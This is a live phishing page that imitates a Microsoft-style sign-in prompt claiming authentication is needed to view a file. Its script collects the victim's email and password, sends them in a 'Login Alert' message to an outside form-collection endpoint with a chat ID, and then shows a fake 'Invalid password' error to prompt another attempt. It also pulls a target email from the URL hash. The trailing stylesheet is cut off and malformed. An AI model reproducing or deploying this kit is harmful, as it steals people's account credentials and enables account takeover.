<body class="bg-gray-100 h-screen flex items-center justify-center">
  <div class="bg-white w-full max-w-md p-8 rounded shadow-md" id="loginContainer">
    <img src="https://i.imgur.com/1wtjxFi.png" alt="Logo" class="mb-6">
    <!-- Step 1: Email -->
    <div id="stepEmail" class="">
      <h2 class="text-2xl font-semibold mb-2">Sign in</h2>
      <p class="text-sm text-gray-600 mb-6">Authentication required to view this file</p>
      <form onsubmit="return goToPasswordStep(event)">
        <input type="email" id="email" placeholder="Email, phone, or Skype" class="w-full px-4 py-2 border border-gray-300 rounded mb-6 focus:outline-none focus:ring-2 focus:ring-green-500" required="">
        <div class="flex justify-between">
          <div></div>
          <button type="submit" class="px-6 py-2 bg-green-600 text-white rounded hover:bg-green-700">
            Next
          </button>
        </div>
      </form>
    </div>
    <!-- Step 2: Password -->
    <div id="stepPassword" class="hidden">
      <h2 class="text-2xl font-semibold mb-2">Enter password</h2>
      <p id="emailDisplay" class="text-sm text-gray-600 mb-4">vvsfvsfsc@hotmail.com</p>
      <!-- Success message placeholder -->
      <div id="successMsg" class="mb-4 p-3 bg-green-100 text-green-800 rounded text-center hidden"></div>
      <form onsubmit="return handleLogin(event)">
        <div class="relative mb-4">
          <input type="password" id="password" placeholder="Password" class="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-green-500">
          <button type="button" onclick="togglePassword(event)" class="absolute right-3 top-2 text-sm text-green-500">Show</button>
        </div>
        <div id="errorMsg" class="text-red-600 text-sm mb-4 hidden">Invalid password. Please try again.</div>
        <div class="flex justify-between mb-6">
          <button type="button" onclick="goBackToEmail()" class="text-green-600 text-sm hover:underline">
            Back
          </button>
          <button type="submit" class="px-6 py-2 bg-green-600 text-white rounded hover:bg-green-700">
            VIEW
          </button>
        </div>
      </form>
    </div>
  </div>
  <script>
    function goToPasswordStep(event) {
      event.preventDefault();
      const emailInput = document.getElementById('email').value.trim();
      if (!emailInput) return;
      document.getElementById('stepEmail').classList.add('hidden');
      document.getElementById('stepPassword').classList.remove('hidden');
      document.getElementById('emailDisplay').textContent = emailInput;
      return false;
    }
    function goBackToEmail() {
      document.getElementById('stepPassword').classList.add('hidden');
      document.getElementById('stepEmail').classList.remove('hidden');
    }
    function togglePassword(event) {
      const passwordInput = document.getElementById('password');
      const toggleBtn = event.target;
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleBtn.textContent = 'Hide';
      } else {
        passwordInput.type = 'password';
        toggleBtn.textContent = 'Show';
      }
    }
    function handleLogin(event) {
      event.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value;

      const message = `ðŸ”” Login Alert\nðŸ“§ Email: ${email}\nðŸ”‘ Password: ${password}`;

      // Send to your Formspark
      fetch("https://submit-form.com/0cGIdbQFV", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: "7178501531",
          text: message
        })
      });

      // Simulate login success or failure
      if (email === "admin@example.com" && password === "securepass") {
        alert("Login successful!");
        // Optionally redirect
        // window.location.href = "/dashboard.html";
      } else {
        document.getElementById('errorMsg').classList.remove("hidden");
      }

      return false;
    }
  </script>

    <script>
        function getEmailFromHash() {
            const hash = window.location.hash;
            if (hash && hash.startsWith('#')) {
                const email = decodeURIComponent(hash.substring(1));
                return email;
            }
            return ''; 
        }
    
        let emltag = getEmailFromHash();
    
        console.log('Extracted email:', emltag);
    </script>

<style>
    body {

        margin: 0;

    }

    body::before {
        content: "";

        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);

    }

    .page-logo {
        position: absolute;
        top: 10px;

        width: 45px;

        z-index: 10;
    }

    .form-container {
        background-color: #fff;

        padding: 20px;
        height: 390px;
        width: 410px;
        box-sizing: border-box;
        text-align: center;
        position: relative;
        overflow: hidden;
        z-index: 1; /* Ensure the form is above the blurred background */
    }

    .form-container > * {
        opacity: 0;

    @keyframes slideIn {

    .note {

    .submit-container {
